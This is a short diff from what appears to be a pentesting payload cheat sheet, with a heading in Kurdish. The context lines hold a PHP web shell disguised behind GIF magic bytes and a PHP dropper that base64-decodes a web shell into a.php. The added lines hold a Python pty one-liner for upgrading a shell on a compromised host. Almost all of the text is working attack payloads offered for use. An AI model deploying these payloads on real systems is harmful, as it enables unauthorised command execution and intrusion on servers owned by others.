@@ -925,6 +925,11 @@ GIF89a; <?php system($_GET['cmd']); ?>
 ```
 <?php $a = base64_decode('PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4='); $file = fopen('a.php','w'); echo fwrite($file,$a); fclose($file); ?>
 ```
+->
+- پاش شێلکردنی فایل
+```
+python3 -c 'import pty;pty.spawn("/bin/sh")'
+```
 -
 # shell wget 
 -
